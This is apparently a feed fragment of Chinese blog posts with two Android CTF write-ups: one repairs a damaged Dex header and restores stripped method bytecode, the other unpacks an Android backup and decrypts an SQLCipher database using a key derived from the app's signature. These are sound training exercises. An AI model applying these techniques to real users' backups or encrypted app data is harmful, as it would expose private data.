&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;解密后的数据就很漂亮了&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/62DDCE8AA3364D774F47E36F7FC1CD60.png&quot; alt=&quot;9.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;将解密后的的数据拼接到abc文件后面，使用JEB打开，提示不是有效Dex文件&lt;/p&gt;

&lt;p&gt;其它工具解析也是类似错误&lt;/p&gt;

&lt;p&gt;使用010Editor的模板功能分析&lt;/p&gt;

&lt;p&gt;红框内全是0，需要我们手动修复一下&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/8D19D2814AD2885C08791E19D373BC38.png&quot; alt=&quot;10.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;首先我们找一个正常的dex.classes文件，用010Editor解析一下&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/24FF0DB81B1CDC25C86A1D8C05D9BA0D.png&quot; alt=&quot;11.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;列一下Dex Header的数据，因为是小端序，所以真实的数据应该是后面这种形式&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Magic Number   : 6465780A30333500
checksum       : F2F21D17---&amp;gt;0x171DF2F2
signature      : EF460EE1CAD15E850483A631BE08972BB135F3A2
file size      : 30D11300---&amp;gt;0x0013D130
header size    : 70000000---&amp;gt;0x00000070
endian tag     : 78563412---&amp;gt;0x12345678
link size      : 00000000---&amp;gt;0x00000000
link off       : 00000000---&amp;gt;0x00000000
map off        : 60F40200---&amp;gt;0x0002F460
string_ids size: 69240000---&amp;gt;0x00002469
string_ids off : 70000000---&amp;gt;0x00000070
type_ids size  : 8A040000---&amp;gt;0x0000048A
type_ids off   : 14920000---&amp;gt;0x00009214
proto_ids size : 4C060000---&amp;gt;0x0000064C
proto_ids off  : 3CA40000---&amp;gt;0x0000A43C
field_ids size : D80D0000---&amp;gt;0x00000DD8
field_ids off  : CCEF0000---&amp;gt;0x0000EFCC
method_ids size: 14220000---&amp;gt;0x00002214
method_ids off : 8C5E0100---&amp;gt;0x00015E8C
class_defs size: E4020000---&amp;gt;0x000002E4
class_defs off : 2C6F0200---&amp;gt;0x00026F2C
data size      : D0DC1000---&amp;gt;0x0010DCD0
data off       : 60F40200---&amp;gt;0x0002F460
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;前面那些可以不在意，我们关注&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_ids size&lt;/code&gt;和&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_ids off&lt;/code&gt;这种数据&lt;/p&gt;

&lt;p&gt;首先是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;string_ids&lt;/code&gt;，起始偏移为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x00000070&lt;/code&gt;，紧跟着Dex Header，长度是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x00002469 * 4&lt;/code&gt;字节&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;string_ids size: 69240000---&amp;gt;0x00002469
string_ids off : 70000000---&amp;gt;0x00000070
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;再看&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;type_ids&lt;/code&gt;，起始偏移为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x00009214&lt;/code&gt;，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;(0x00009214 - 0x00000070) / 4&lt;/code&gt;刚好是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x00002469&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;type_ids size  : 8A040000---&amp;gt;0x0000048A
type_ids off   : 14920000---&amp;gt;0x00009214
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;再来看一组&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;proto_ids&lt;/code&gt;，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;(0x0000A43C - 0x00009214) / 4&lt;/code&gt;是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x0000048A&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;proto_ids size : 4C060000---&amp;gt;0x0000064C
proto_ids off  : 3CA40000---&amp;gt;0x0000A43C
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;我们正向算一次，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;(0x0000A43C + 0x0000064C * 12)&lt;/code&gt;是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x0000EFCC&lt;/code&gt;，这里长度是12是因为它的结构数据长度是12个字节&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;field_ids size : D80D0000---&amp;gt;0x00000DD8
field_ids off  : CCEF0000---&amp;gt;0x0000EFCC
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;对照着这种方法来修复一下刚才合成Dex文件&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Magic Number   : 6465780A30333500
checksum       : A3884319---&amp;gt;0x194388A3
signature      : C2877A0143D4146CACDE1A8BAEEF0C8C06A135E6
file size      : F0491500---&amp;gt;0x001549F0
header size    : 70000000---&amp;gt;0x00000070
endian tag     : 78563412---&amp;gt;0x12345678
link size      : 00000000---&amp;gt;0x00000000
link off       : 00000000---&amp;gt;0x00000000
map off        : 94F80200---&amp;gt;0x0002F894
string_ids size: 00000000---&amp;gt;0x00000000
string_ids off : 70000000---&amp;gt;0x00000070
type_ids size  : 00000000---&amp;gt;0x00000000
type_ids off   : DC910000---&amp;gt;0x000091DC
proto_ids size : 00000000---&amp;gt;0x00000000
proto_ids off  : ECA30000---&amp;gt;0x0000A3EC
field_ids size : 00000000---&amp;gt;0x00000000
field_ids off  : 28EF0000---&amp;gt;0x0000EF28
method_ids size: 00000000---&amp;gt;0x00000000
method_ids off : B85D0100---&amp;gt;0x00015DB8
class_defs size: E2020000---&amp;gt;0x000002E2
class_defs off : C86D0200---&amp;gt;0x00026DC8
data size      : 5C511200---&amp;gt;0x001251C5
data off       : 94F80200---&amp;gt;0x0002F894
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;然后我们噼里啪啦一通啪啪啪(此处是按计算器的拟声词)算&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;string_ids size = (0x000091DC - 0x00000070) / 4  = 0x0000245B
type_ids size   = (0x0000A3EC - 0x000091DC) / 4  = 0x00000484
proto_ids size  = (0x0000EF28 - 0x0000A3EC) / 12 = 0x00000645
field_ids size  = (0x00015DB8 - 0x0000EF28) / 8  = 0x00000DD2
method_ids size = (0x00026DC8 - 0x00015DB8) / 8  = 0x00002202
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;现在就已经计算完所有需要计算的数据了&lt;/p&gt;

&lt;p&gt;如果不想算，还有一个办法，就是maps数据&lt;/p&gt;

&lt;p&gt;正常的Dex文件maps数据，12个字节为一个item&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/4D046EAD33C5E90FFCA9EB10916559AC.png&quot; alt=&quot;12.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;把合成的Dex文件maps段数据拷贝出来，整理一下&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;11000000---&amp;gt;0x00000011
0000-0000-01000000-00000000
0100-0000-5B240000-70000000
0200-0000-84040000-DC910000
0300-0000-45060000-ECA30000
0400-0000-D20D0000-28EF0000
0500-0000-02220000-B85D0100
0600-0000-E2020000-C86D0200
0010-0000-01000000-94F80200
0110-0000-D3030000-70F90200
0310-0000-11030000-60220300
0020-0000-CC020000-D0420300
0120-0000-B6150000-9C5C0400
0220-0000-5B240000-B8E60B00
0320-0000-B6150000-745E0F00
0420-0000-6D030000-E4141400
0520-0000-7A000000-F4C01400
0620-0000-5B020000-E8181500
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;对比就可以发现其实这里就有我们需要的数据，而且已经计算好了&lt;/p&gt;

&lt;p&gt;将计算出来的偏移填充进去，注意是小端序&lt;/p&gt;

&lt;p&gt;修复完如下，可以直接修改010Editor右边窗口的数据，左边会自动修改为小端序&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/69683E1A2BFA3697B19AC4EC729B7DD4.png&quot; alt=&quot;13.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;使用JEB打开修复后的Dex文件&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/86F23EF225CBABEB6D779F404D93EB7C.png&quot; alt=&quot;14.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;发现&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;onCreate()&lt;/code&gt;方法反编译失败&lt;/p&gt;

&lt;p&gt;查看对应的smali代码&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/562294F2F8EB77BE33D60E2D97D89C84.png&quot; alt=&quot;15.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;发现&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;onCreate()&lt;/code&gt;方法的代码是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nop&lt;/code&gt;，鉴于其它方法都是正常的，那么这里明显是被抽走了，搞过加固的同学肯定眼熟这种形式，运行时动态恢复指令，但是这里没有so，明显不是&lt;/p&gt;

&lt;p&gt;踌躇之际，我突然想到还有一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;y&lt;/code&gt;，长度是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x94&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/858A033B189BBE404F5A5304449DE87F.png&quot; alt=&quot;16.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;再看这里&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nop&lt;/code&gt;指令长度&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;.method protected onCreate(Bundle)V
          .registers 8
          .param p1, &quot;savedInstanceState&quot;
00000000  nop
          .prologue
00000002  nop
00000004  nop
00000006  nop
00000008  nop
0000000A  nop
0000000C  nop
0000000E  nop
00000010  nop
00000012  nop
00000014  nop
00000016  nop
00000018  nop
0000001A  nop
0000001C  nop
0000001E  nop
00000020  nop
          .local v1, &quot;strb&quot;:Ljava/lang/StringBuilder;
00000022  nop
00000024  nop
00000026  nop
00000028  nop
0000002A  nop
0000002C  nop
0000002E  nop
00000030  nop
00000032  nop
00000034  nop
00000036  nop
00000038  nop
0000003A  nop
0000003C  nop
0000003E  nop
00000040  nop
00000042  nop
00000044  nop
00000046  nop
00000048  nop
0000004A  nop
0000004C  nop
0000004E  nop
00000050  nop
00000052  nop
00000054  nop
00000056  nop
00000058  nop
0000005A  nop
0000005C  nop
0000005E  nop
00000060  nop
00000062  nop
00000064  nop
          .local v0, &quot;flag&quot;:Ljava/lang/String;
00000066  nop
00000068  nop
0000006A  nop
0000006C  nop
0000006E  nop
00000070  nop
00000072  nop
00000074  nop
00000076  nop
00000078  nop
0000007A  nop
0000007C  nop
0000007E  nop
00000080  nop
00000082  nop
00000084  nop
00000086  nop
00000088  nop
0000008A  nop
0000008C  nop
0000008E  nop
00000090  nop
00000092  nop
.end method
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;长度也是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x94&lt;/code&gt;，一条指令2字节长度，最后&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x92 + 2&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;那么&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;y&lt;/code&gt;就应该是被抽走的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;onCreate()&lt;/code&gt;方法的指令&lt;/p&gt;

&lt;p&gt;使用IDA打开Dex，找到对应的偏移&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x00097390&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/74B6F5E93CF6AAAB3CED2D132A379CAB.png&quot; alt=&quot;17.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;找到偏移后，使用Winhex找到Dex文件对应的偏移&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/92D953F404A4771CC3FB344BA8322CEF.png&quot; alt=&quot;18.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;一大片空白，将&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;y&lt;/code&gt;的数据拷贝进去&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/75B13D0EE817CB5095AE957C46D2F703.png&quot; alt=&quot;19.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;保存之后使用JEB打开最终的Dex文件&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/7B118DC82BD02C6A8E32A4F228946367.png&quot; alt=&quot;20.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;写下代码跑出Flag&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public class Main {
	public static void main(String[] args) throws Exception{
		String seed = &quot;m3ll0t_yetFLag&quot;;
		StringBuilder v1 = new StringBuilder(seed);
        v1.replace(0, 1, &quot;h&quot;);
        v1.replace(5, 6, &quot;2&quot;);
        v1.replace(10, 11, &quot;f&quot;);
        v1.replace(7, 8, &quot;G&quot;);
		System.out.println(v1.toString());
	}
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;输出&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;h3ll02_GetfLag
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这题我喜欢！！！！！！&lt;/p&gt;

&lt;p&gt;做出这题的成本 = 四杯奶茶 + 一只脆皮鸡 = 32(元)&lt;/p&gt;

&lt;p&gt;泡奶茶的五毛钱开水就不算了&lt;/p&gt;
</description>
                <pubDate>Wed, 22 Mar 2017 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/android_ctf/2017/03/22/2015-XCTF&RCTF-where-300.html</link>
                <guid isPermaLink="true">http://localhost:4000/android_ctf/2017/03/22/2015-XCTF&RCTF-where-300.html</guid>
            </item>
        
            <item>
                <title>2015 XCTF-RCTF - flag-system-100</title>
                <description>&lt;p&gt;2015XCTF福州站的第一道Mobile题，同时也是RCTF的题目，100分&lt;/p&gt;

&lt;p&gt;第一个坑，先判断这是个啥玩意，file没看出来，但是应该是有的&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wnagzihxain@wnagzihxa1n:~$ file 2e204fe0ec33b1689f1c47bd60a9770c
2e204fe0ec33b1689f1c47bd60a9770c: data
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;后来查看16进制格式，才发现这是个Android Backup文件&lt;/p&gt;

&lt;p&gt;能搜到搞这玩意的文章确实是不多，这里根据外国网友提供的方法，我们来一发&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wnagzihxain@wnagzihxa1n:~$ dd if=2e204fe0ec33b1689f1c47bd60a9770c.ab bs=1 skip=24 of=compressed
记录了8977280+0 的读入
记录了8977280+0 的写出
8977280 bytes (9.0 MB, 8.6 MiB) copied, 96.922 s, 92.6 kB/s
wnagzihxain@wnagzihxa1n:~$ printf &quot;\x1f\x8b\x08\x00\x00\x00\x00\x00&quot; | cat - compressed | gunzip -c &amp;gt; decompressed.tar
gzip: stdin: unexpected end of file
wnagzihxain@wnagzihxa1n:~$ tar xf decompressed.tar 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;解压生成一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apps&lt;/code&gt;文件夹，查看一下文件树，发现有一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BOOKS.db&lt;/code&gt;，这一定是个关键文件&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wnagzihxain@wnagzihxa1n:~$ tree apps
apps
├── com.example.mybackup
│   ├── a
│   │   └── com.example.mybackup-1.apk
│   ├── db
│   │   └── BOOKS.db
│   ├── f
│   │   └── icu
│   │       └── icudt46l.dat
│   └── _manifest
└── com.example.zi
    ├── a
    │   └── com.example.zi-2.apk
    └── _manifest

7 directories, 6 files
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;再翻其余文件夹，发现有两个APK文件，在反编译查看代码后，确定&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.example.mybackup&lt;/code&gt;这个比较有用&lt;/p&gt;

&lt;p&gt;在简单的分析过后，可以确定的是，这个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BOOKS.db&lt;/code&gt;用了sqlcipher加密了，秘钥的生成方式如下&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public BooksDB(Context context) {
    super(context, DATABASE_NAME, null, 1);
    this.k = Test.getSign(context);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getSign()&lt;/code&gt;方法如下&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public static String getSign(Context context) {
    for (PackageInfo packageinfo : context.getPackageManager().getInstalledPackages(64)) {
        if (packageinfo.packageName.equals(context.getPackageName())) {
            return SHA1(packageinfo.signatures[0].toCharsString());
        }
    }
    return &quot;&quot;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;然后SHA1加密&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public static String SHA1(String decript) {
    try {
        MessageDigest digest = MessageDigest.getInstance(&quot;SHA-1&quot;);
        digest.update(decript.getBytes());
        byte[] messageDigest = digest.digest();
        StringBuffer hexString = new StringBuffer();
        for (byte b : messageDigest) {
            String shaHex = Integer.toHexString(b &amp;amp; MotionEventCompat.ACTION_MASK);
            if (shaHex.length() &amp;lt; 2) {
                hexString.append(0);
            }
            hexString.append(shaHex);
        }
        return hexString.toString();
    } catch (NoSuchAlgorithmException e) {
        e.printStackTrace();
        return &quot;&quot;;
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;那么我们只需要写个APP去获取即可，只需要把&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getSign()&lt;/code&gt;方法中间的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;equals()&lt;/code&gt;方法里的参数换成样本的包名即可&lt;/p&gt;

&lt;p&gt;然后获取到加密秘钥&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;320b42d5771df37906eee0fff53c49059122eeaf
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;获取到秘钥，接下来写个APP去解密&lt;/p&gt;

&lt;p&gt;首先将样本里的lib文件拷贝到工程的jniLibs文件夹里，再从下面的地址下载对应的jar包，解压后将三个jar包放到libs文件夹下&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://www.zetetic.net/sqlcipher/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;各种搞定文件的结构应该是这样的&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/79F580208332E1F1C851EBAC489D2C93.png&quot; alt=&quot;1.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;然后写代码&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;package com.wnagzihxain.myapplication;

import android.os.Bundle;
import android.app.Activity;
import android.util.Log;

import net.sqlcipher.database.SQLiteDatabase;
import java.io.File;

public class MainActivity extends Activity {

    private final String SDcardPath = &quot;/mnt/sdcard/&quot;;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        SQLiteDatabase.loadLibs(this);//引用SQLiteDatabase的方法之前必须先添加这句代码
        decrypt(&quot;BOOKS.db&quot;, &quot;decryptedtest.db&quot;, &quot;320b42d5771df37906eee0fff53c49059122eeaf&quot;);
    }

    /**
     * 解密数据库
     * @param encryptedName 要解密的数据库名称
     * @param decryptedName 解密后的数据库名称
     * @param key 密码
     */
    private void decrypt(String encryptedName, String decryptedName, String key) {
        try {
            File databaseFile = getDatabasePath(SDcardPath + encryptedName);
            SQLiteDatabase database = SQLiteDatabase.openOrCreateDatabase(databaseFile, key, null);
            if (database != null) {
                database.close();
            }
            database = SQLiteDatabase.openDatabase(databaseFile.toString(), key, null, SQLiteDatabase.OPEN_READWRITE);
            File decrypteddatabaseFile = getDatabasePath(SDcardPath + decryptedName);
            //连接到解密后的数据库，并设置密码为空
            database.rawExecSQL(String.format(&quot;ATTACH DATABASE '%s' as &quot;+ decryptedName.split(&quot;\\.&quot;)[0] +&quot; KEY '';&quot;, decrypteddatabaseFile.getAbsolutePath()));
            database.rawExecSQL(&quot;SELECT sqlcipher_export('&quot;+ decryptedName.split(&quot;\\.&quot;)[0] + &quot;');&quot;);
            database.rawExecSQL(&quot;DETACH DATABASE &quot;+ decryptedName.split(&quot;\\.&quot;)[0] + &quot;;&quot;);
            SQLiteDatabase decrypteddatabase = SQLiteDatabase.openOrCreateDatabase(decrypteddatabaseFile, &quot;&quot;, null);
            decrypteddatabase.close();
            database.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;添加权限&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;uses-permission android:name=&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot; /&amp;gt;
&amp;lt;uses-permission android:name=&quot;android.permission.READ_EXTERNAL_STORAGE&quot; /&amp;gt;
&amp;lt;uses-permission android:name=&quot;android.permission.INTERNET&quot; /&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;先把&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BOOKS.db&lt;/code&gt;文件push到&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/sdcard/&lt;/code&gt;路径下，然后运行APP，即可在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/sdcard/&lt;/code&gt;下看到解密后的数据库文件，最后pull到本地&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@jflte:/sdcard # ls | grep &quot;.db&quot;
BOOKS.db
root@jflte:/sdcard # ls | grep &quot;.db&quot;
BOOKS.db
decryptedtest.db
root@jflte:/sdcard # exit
C:\Users\wangz&amp;gt;adb pull /sdcard/decryptedtest.db C:\Users\wangz\Desktop
[100%] /sdcard/decryptedtest.db
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;使用sqlcipher.exe可视化工具打开&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/5766B59C41B50912CE915C1EF9169BF5.png&quot; alt=&quot;2.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;再结合要求，Flag：RCTF{backuuuuuP}&lt;/p&gt;

&lt;p&gt;老铁，真的就这么简单吗？&lt;/p&gt;

&lt;p&gt;按理说到这里瞎扯两句&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;有兴趣的同学可以跟着玩玩&lt;/code&gt;就行了，但我不！！！！！！&lt;/p&gt;

&lt;p&gt;我要把我的扎心经历讲粗来！！！！！！&lt;/p&gt;

&lt;p&gt;上面那么顺畅的解题过程问人间哪里有？？？？？？&lt;/p&gt;

&lt;p&gt;首先知道这是Android BackUp文件倒不是很难，因为十六进制看Magic Number一下子就看出来了&lt;/p&gt;

&lt;p&gt;难的地方在哪里，如何解压是个问题，一开始我并不熟悉这个文件的格式，所以在Github上找了个工具来解压&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://github.com/nelenkov/android-backup-extractor
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;然而这玩意并不能解压给的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BOOKS.db&lt;/code&gt;，问了某老铁才知道，因为只支持到v3，然而作者把这个字段改了一下。。。。。。&lt;/p&gt;

&lt;p&gt;改成3，继续解压，依旧不行，后来才知道，Compressed那个字段要改成1，作者也改了。。。。。。&lt;/p&gt;

&lt;p&gt;后来直接在Google上找了老外写的方法，一下子就搞出来了&lt;/p&gt;

&lt;p&gt;也就是上面写的方法&lt;/p&gt;

&lt;p&gt;解压出了文件之后，解密&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BOOKS.db&lt;/code&gt;是一个大问题&lt;/p&gt;

&lt;p&gt;作为一个开发者，第一想法是写个APP，用sqlcipher库去解密给的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BOOKS.db&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;但是莫名不想写&lt;/p&gt;

&lt;p&gt;于是想着，网上应该有对这种数据库加密的解密工具吧，于是找啊找&lt;/p&gt;

&lt;p&gt;还真的找到了，凭借着神一般的记忆力，我给列一下&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;CSDN—某命令行工具2.0版本，解密出错&lt;/li&gt;
  &lt;li&gt;CSDN—某命令行工具3.0版本，解密出错&lt;/li&gt;
  &lt;li&gt;Github—某需要自行编译的工具
    &lt;ul&gt;
      &lt;li&gt;32位Ubuntu编译出错，一直以为是编译环境问题&lt;/li&gt;
      &lt;li&gt;64位Ubuntu编译成功，解密出错&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;某可视化数据库查看工具—解密出错&lt;/li&gt;
  &lt;li&gt;还有好几个需要自己编译的。。。。。。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;两天就这么过去了。。。。。。&lt;/p&gt;

&lt;p&gt;想了想，我还是回归开发者吧&lt;/p&gt;

&lt;p&gt;东拼西凑，根据别人的代码写了个解密的APP&lt;/p&gt;

